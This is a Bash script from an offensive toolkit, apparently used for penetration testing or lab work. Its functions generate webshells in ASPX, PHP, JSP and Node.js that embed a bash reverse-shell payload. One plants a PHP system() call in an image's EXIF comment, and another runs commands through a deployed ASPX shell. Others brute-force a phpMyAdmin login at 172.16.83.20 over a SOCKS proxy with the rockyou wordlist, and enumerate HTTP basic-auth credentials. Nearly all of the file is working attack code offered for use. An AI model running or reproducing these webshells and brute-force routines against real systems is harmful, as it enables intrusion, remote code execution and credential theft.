#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/reverse_shell.sh
source $SCRIPTDIR/network.sh
source $SCRIPTDIR/project.sh
get_http_form() {
    local url=$1
    if [ -z "$url" ]; then
        echo "Usage: get_http_form <url>"
        return 1
    fi
    curl -s $url | awk '/<form/  { print; while (getline > 0 && !/\/form>/) {print;}; print;  next}'

}


extract_hidden_input() {
    local page=$1
    local target_form=$2
    
    # Extract the entire form first, then process all hidden inputs
    local form_content
    if [[ -z "$target_form" ]]; then
        # Get first form
        form_content=$(echo "$page" | sed -n '/<form[^>]*>/,/<\/form>/p' | head -n -0)
    else
        # Get specific form by ID or number
        if [[ "$target_form" =~ ^[0-9]+$ ]]; then
            # Target by form number
            form_content=$(echo "$page" | awk -v target="$target_form" '
                /<form[^>]*>/ { forms++; if(forms==target) start=1 }
                start { print }
                /<\/form>/ { if(start) exit }
            ')
        else
            # Target by form ID
            form_content=$(echo "$page" | awk -v target="$target_form" '
                /<form[^>]*id="'$target_form'"[^>]*>/ { start=1 }
                start { print }
                /<\/form>/ { if(start) exit }
            ')
        fi
    fi
    
    # Extract all hidden inputs from the form content
    echo "$form_content" | grep -oE '<input[^>]*type="hidden"[^>]*>' | while read -r input; do
        name=$(echo "$input" | sed -n 's/.*name="\([^"]*\)".*/\1/p')
        value=$(echo "$input" | sed -n 's/.*value="\([^"]*\)".*/\1/p')
        value=$(urlencode "$value")
        if [[ -n "$name" ]]; then
            echo "${name}=${value}"
        fi
    done | paste -sd ','
}



get_hidden_inputs() {
    local url="$1"
    local target_form="$2"
    if [[ -z "$url" ]]; then
        echo "Usage: get_hidden_inputs <url>" >> $trail_log
        return 1
    fi
    if [[ -z "$cookie_jar" ]]; then
        cookie_jar="cookie.txt"
    fi
    local proxy_option=""
    if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == "true" ]]; then
        if [[ -z "$proxy_target" ]] || [[ -z "$proxy_port" ]]; then
            echo "Proxy target or port is not set." >> $trail_log 
            return 1
        fi
        proxy_option="-x $proxy_type://$proxy_target:$proxy_port"
        echo "Using $proxy_option" >> $trail_log
    fi
    #echo curl -c $cookie_jar -s "$url" $proxy_option 
    #echo curl -c $cookie_jar -s $proxy_option  $hidden_inputs_additional_options "$url"
    local page=$(curl -b $cookie_jar -c $cookie_jar -s $proxy_option  $hidden_inputs_additional_options "$url")
    if [[ -z "$page" ]]; then
        echo "Failed to fetch the page. Please check the URL." >> $trail_log
        return 1
    fi
    extract_hidden_input "$page" "$target_form"
}

get_iis_hidden_inputs() {
    if [[ -z "$target_url" ]]; then
        target_url="$1"
    fi
    if [[ -z "$target_form" ]]; then
        target_form="$2"
    fi
    local hidden_inputs=$(get_hidden_inputs "$target_url" "$target_form")
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/ -F /g')
    hidden_inputs="-F $hidden_inputs"
    echo $hidden_inputs
}

get_post_hidden_inputs() {
    if [[ -z "$target_url" ]]; then
        target_url="$1"
    fi
    if [[ -z "$target_form" ]]; then
        target_form="$2"
    fi
    local hidden_inputs=$(get_hidden_inputs "$target_url" "$target_form")
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
    echo $hidden_inputs
}


create_aspx_webshell() {
    cp $SCRIPTDIR/../aspx/webshell.aspx .

}

run_aspx_shell_command() {

    if [[ -z "$target_url" ]]; then
        echo "Target URL is not set."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "Command to execute is not set."
        return 1
    fi
    local proxy_option="--proxy localhost:8080"
    local hidden_inputs=$(get_post_hidden_inputs "$target_url")
    echo $hidden_inputs
    local txtCommand=$(urlencode "$cmd")
    curl -b $cookie_jar -c $cookie_jar $target_url \
    -d "txtCommand=$txtCommand" \
    -d "btnExecute=Execute" \
    -d "$hidden_inputs" $proxy_option

}


create_php_web_shell() {
    cp $SCRIPTDIR/../php/webshell.php .
    if [[ -z "$cmd" ]]; then
        cmd=$(get_bash_reverse_shell)
        cmd=$(encode_bash_payload "$cmd")
    fi
    local cmd_replacement=$(escape_sed "$cmd")
    cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
    sed -E -i "s/\{cmd\}/$cmd_replacement/g" webshell.php
    
    if [[ ! -z "$minimize_webshell" ]] && [[ "$minimize_webshell" == "true" ]]; then
        sed -E -i '/html/d' webshell.php
        sed -E -i '/body/d' webshell.php
        sed -E -i '/title/d' webshell.php
        sed -E -i '/head/d' webshell.php
        sed -E -i '/pre/d' webshell.php        
    fi
}

create_werkzeug() {
    cp $SCRIPTDIR/../python/werkzeug.py .
    if [[ -z "$cmd" ]]; then
        cmd=$(get_bash_reverse_shell)
        cmd=$(encode_bash_payload "$cmd")
    fi
    local cmd_replacement=$(escape_sed "$cmd")
    cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\\\"/g')
    sed -E -i "s/\{command\}/$cmd_replacement/g" werkzeug.py

}

create_python_upload() {
    cp $SCRIPTDIR/../python/upload.py .
    generate_linux_download upload.py
}

create_jsp_webshell() {
    cp $SCRIPTDIR/../jsp/webshell.jsp .
    if [ -z "$cmd" ]; then
        reverse_type="java_exec"
        cmd=$(get_bash_reverse_shell)
    fi
    local cmd_replacement=$(escape_sed "$cmd")
    cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
    sed -E -i "s/\{cmd\}/$cmd_replacement/g" webshell.jsp
    
    if [[ ! -z "$minimize_webshell" ]] && [[ "$minimize_webshell" == "true" ]]; then
        sed -E -i '/html/d' webshell.jsp
        sed -E -i '/body/d' webshell.jsp
        sed -E -i '/title/d' webshell.jsp
        sed -E -i '/head/d' webshell.jsp
        sed -E -i '/pre/d' webshell.jsp
        sed -E -i '/h1/d' webshell.jsp
    fi
}

create_image_webshell() {
    cp $SCRIPTDIR/../images/blank.jpg .
    local command=""
    if [[ -z "$cmd" ]]; then
        command="\$_GET[\"cmd\"]"
    else
        command="'$cmd'"
    fi
    exiftool -Comment="<?php system($command); ?>" blank.jpg
    file blank.jpg
}

create_nodejs_webshell() {
    cp $SCRIPTDIR/../js/node.js .
    if [[ -z "$cmd" ]]; then
        cmd=$(get_bash_reverse_shell)
        encode_ifss=true
        cmd=$(encode_bash_payload "$cmd")
    fi
    local cmd_replacement=$(escape_sed "$cmd")
    sed -E -i "s/\{command\}/$cmd_replacement/g" node.js

}

run_curl() {

    local url=$1
    if [[ -z $url ]]; then
        echo "Usage: run_curl <url>"
        return 1
    fi
    if [[ -z $use_proxychain ]] || [[ $use_proxychain == "false" ]]; then
        curl -s "$url"
    else
        curl -s "$url" --proxy "socks5://$proxy_target:$proxy_port"
    fi
}

perform_phpmyadmin_attack() {
    
    for password in $(cat /usr/share/wordlists/rockyou.txt); do
        #echo curl -x "socks5://127.0.0.1:1080" -b "$cookie_jar" -c "$cookie_jar" -d "$hidden_inputs&pma_username=root&pma_password=$password" "http://172.16.83.20/phpMyAdmin/index.php"
        #hidden_inputs=$(get_post_hidden_inputs "http://172.16.83.20:80/phpMyAdmin/index.php" "login_form" )
        #echo $hidden_inputs
        page=$(curl -x "socks5://127.0.0.1:1080" -b "$cookie_jar" -c "$cookie_jar" -s -d "$hidden_inputs&pma_username=andrew&pma_password=$password" "http://172.16.83.20/phpMyAdmin/index.php")
        if echo "$page" | grep "Access denied"; then
            echo "Password not found: $password"
            #echo page=$page
            set_session=$(echo $page | grep -oP 'name="set_session" value="\K[^"]+')
            token=$(echo $page | grep -oP 'name="token" value="\K[^"]+' | head -n 1)
            hidden_inputs="set_session=$set_session&token=$token"
            #hidden_inputs=$(extract_hidden_input "$page" "login_form")
            #hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
            #hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
            echo $hidden_inputs
        else
            echo "$page" 
            echo "Password found: $password"
            break
        fi
    done


}

download_web_folder() {
    if [[ -z $download_folder ]]; then
        download_folder="download"
    fi
    if [[ ! -d "$download_folder" ]]; then
        mkdir -p "$download_folder"
    fi
    pushd "$download_folder" || return 1
    if [[ ! -z "$1" ]]; then
        target_url="$1"
    fi
    if [[ -z "$target_url" ]]; then
        echo "Target URL is not set."
        return 1
    fi
    local proxy_option=""
    if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == true ]]; then
        proxy_option="proxychains -q "
    fi
    ${proxy_option}wget -r -nH -R 'index.html*' --no-parent "$target_url"
    popd || return 1
}

generate_php_hash() {
    if [[ -z "$password" ]]; then
        echo "Password is not set."
        return 1
    fi
    local php_password=$password
    if [[ -z "$php_password_algorithm" ]]; then
        php_password_algorithm=PASSWORD_DEFAULT
    fi
    cp $SCRIPTDIR/../php/password_hash.php .
    local php_password=$(escape_sed $password)
    php_password_algorithm=$(escape_sed $php_password_algorithm)
    sed -E -i "s/\{php_password\}/$php_password/g" password_hash.php
    sed -E -i "s/\{php_password_algorithm\}/$php_password_algorithm/g" password_hash.php
    php password_hash.php
}

verify_response() {
    local user=$1
    local pass=$2
    response=$(curl -s -I -u $user:$pass $target_url)
    if [[ -z $response ]]; then
        echo "Response is empty."
        return 1
    fi
    if echo "$response" | grep -q "401 Unauthorized"; then
        #echo "Response indicates unauthorized access."
        return 1
    else
        #echo "Response indicates authorized access for $user:$pass"
        return 0
    fi
    
}

enumerate_basic_authentication() {
    if [[ -z "$target_url" ]]; then
        echo "Target IP is not set."
        return 1
    fi
    if [[ -z $username ]] || [[ -z $password ]]; then
        echo "Username or password is not set"
        return 1
    fi
    response=""
    if [[ -f $username ]]; then
        while IFS= read -r user; do
            if [[ -f $password ]]; then
                while IFS= read -r pass; do
                    if verify_response "$user" "$pass"; then
                        echo "Authorized access for $user:$pass"
                        return 0
                    fi
                done < "$password"
                continue
            else
                if verify_response "$user" "$password"; then
                    echo "Authorized access for $user:$password"
                    return 0
                fi
            fi
        done < "$username"
    else
        if [[ -f $password ]]; then
            while IFS= read -r pass; do
                if verify_response "$username" "$pass"; then
                    echo "Authorized access for $username:$pass"
                    return 0
                fi
            done < "$password"
        else
            if verify_response "$username" "$password"; then
                echo "Authorized access for $username:$password"
                return 0
            fi
        fi
    fi

}